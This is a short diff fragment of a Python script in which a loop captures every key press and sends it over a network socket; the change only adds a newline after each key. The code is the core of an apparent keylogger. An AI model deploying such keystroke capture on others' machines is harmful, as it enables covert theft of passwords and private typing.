@@ -19,5 +19,4 @@ if __name__ == '__main__':
     while True:
         current_key = keyboard.read_key()
         if current_key != None:
-            client.send(str(current_key).encode())
-            
+            client.send(f"{str(current_key)}\n".encode())
